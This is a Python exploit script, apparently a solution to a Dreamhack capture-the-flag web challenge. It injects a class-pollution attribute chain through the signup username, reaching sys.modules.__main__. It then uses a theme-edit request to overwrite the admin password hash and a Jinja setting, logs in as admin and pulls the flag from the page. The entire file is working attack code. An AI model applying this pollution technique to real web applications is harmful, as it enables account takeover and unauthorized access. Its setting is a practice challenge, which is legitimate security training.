import requests
from hashlib import sha256
import re

url = "http://host8.dreamhack.games:13805/"
s = requests.Session()

class auth():
    @staticmethod
    def verify(password : str, hashed_password : str) -> bool:
        return auth.hash(password) == hashed_password
    
    @staticmethod
    def _hash(password : str) -> str:
        m = sha256(password.encode())

        return m.hexdigest()

    @staticmethod
    def hash(password : str) -> str:
        hashed_password = password

        for _ in range(256):
            hashed_password = auth._hash(hashed_password)

        return hashed_password

def pollute(payload, value):
    chain = "guest.__class__.__init__.__globals__.__builtins__.help.__call__.__globals__.sys.modules.__main__"

    creds = {
        'username': f'{chain}.{payload}.',
        'password': 'a' * 8
    }

    res = s.post(f'{url}/signup', data=creds)
    res = s.post(f'{url}/login', data=creds)

    if "logout" in res.text.lower():
        print("> Logged in")

    res = s.post(f'{url}/theme/edit', data={
        'key': 'color',
        'value': value
    })

    print("> Polluted", payload)

    s.get(f'{url}/logout')

# get admin login
pwd = "hacked"

pollute("users.admin.pw", auth.hash(pwd))

# disable jinja comments
pollute('app.jinja_env.comment_start_string', 'aishdoaihdosaihdoa')

# get flag
res = s.post(f'{url}/login', data={
    'username': 'admin',
    'password': pwd
})

res = s.get(f"{url}/admin")

flag = re.findall(r'\'(DH{.+})\'', res.text)[0]
print("Flag:", flag)